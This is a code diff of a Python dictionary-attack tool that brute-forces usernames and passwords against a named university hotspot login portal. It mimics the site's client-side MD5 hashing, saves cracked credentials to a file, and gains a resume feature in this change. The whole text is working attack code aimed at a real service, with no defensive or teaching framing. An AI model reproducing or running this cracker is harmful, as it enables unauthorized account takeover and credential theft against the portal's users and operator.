@@ -27,7 +27,12 @@ def opener(user_list, pass_list):
             usernames = f.readlines() # contains the list of usernames
         with open(os.getcwd()+"/"+pass_list, "r") as f:
             passwords = f.readlines() #contains the list of passwords
+        first_unresumed = passwords[0]
         print("Loaded "+str(len(usernames))+" usernames with "+str(len(passwords))+" passwords...")
+        passwords = try_resume(passwords)
+        first_resumed = passwords[0]
+        if first_resumed != first_unresumed:
+            print("Resume point found...resuming from "+first_resumed+"\npasswords remaining: "+str(len(passwords)))
         cracker(usernames, passwords)
     except IOError as e:
         print(e)
@@ -37,21 +42,33 @@ def opener(user_list, pass_list):
 #this function try all the combination of usernames and password in the
 #supplied dictionaries(of usernames and passwords)
 def cracker(usernames, passwords):
-    with open(os.getcwd()+"/cracked_cred.dmd", "a") as f:
-        start_time = time()
-        print("Started at %s \nCracking..."%ctime(start_time))
-        for psswds in passwords:
-            psswd = psswds.strip("\n")
-            for users in usernames:
-                user = users.strip("\n")
-                psswd = encrypt(psswd) #placed here in case of more than 1 username
-                print("trying user: "+user+" with hash "+psswd)
-                cracked = checker(user, psswd)
-                if cracked:
-                    f.write(user+"::"+psswds+"\n")
-                    print("found password for "+user+" ==> "+psswds)
-                    usernames.remove(users)
-    print("Exhausted the list of passwords \n total time taken: %s"%time()-start_time)
+    try:
+        with open(os.getcwd()+"/cracked_cred.dmd", "a") as f:
+            start_time = time()
+            print("Started at %s \nCracking..."%ctime(start_time))
+            for psswds in passwords:
+                psswd = psswds.strip("\n")
+                for users in usernames:
+                    user = users.strip("\n")
+                    psswd = encrypt(psswd) #placed here in case of more than 1 username
+                    print("trying user: "+user+" with hash "+psswd)
+                    cracked = checker(user, psswd)
+                    if cracked == True:
+                        f.write(user+"::"+psswds+"\n")
+                        print("found password for "+user+" ==> "+psswds)
+                        usernames.remove(users)
+                    elif cracked == "somethin":
+                        print("somthing abnormal happened...with user: "+user+" with password: "+psswds)
+                        raise KeyboardInterrupt
+        print("Exhausted the list of passwords \n total time taken: %s"%time()-start_time)
+    except KeyboardInterrupt:
+        with open(os.getcwd()+"/resume.dmd", "w") as f:
+            f.write(psswds)
+        exit()
+    except Exception as e:
+        print(e)
+        exit()
+
 
 
 
@@ -68,10 +85,11 @@ def checker(user, psswd):
             with requests.Session() as s:
                 s.get("http://hotspot.abu.edu.ng/logout")
             return True
-        else:
-            return False
-    except Exception:
-        pass
+        elif "ANNOUNCEMENT" not in page:
+            return "somethin"
+    except Exception as e:
+        print(e)
+        exit()
 
 #this function replicates the security implementation used in the site
 #which is happening on client side
@@ -92,10 +110,23 @@ def encrypt(psswd):
             chars.append(chr(int(i, 8)))  #append a chr value which is converted from int
         second = "".join(chars)
         return hashlib.md5(first+psswd+second).hexdigest()
-    except Exception:
-            pass
+    except Exception as e:
+            print(e)
+            exit()
 
-
+def try_resume(passwords):
+    if not os.path.exists(os.getcwd()+"/resume.dmd"):
+        file_open = open(os.getcwd()+"/resume.dmd", "w")
+        file_open.close()
+        return passwords
+    with open("resume.dmd", "r") as f:
+        last_pass = f.readline()
+    if last_pass.strip("\n") == "":
+        return passwords
+    else:
+        pass_index = passwords.index(last_pass)
+        passwords = passwords[pass_index:]
+        return passwords
 
 if __name__=="__main__":
     main()
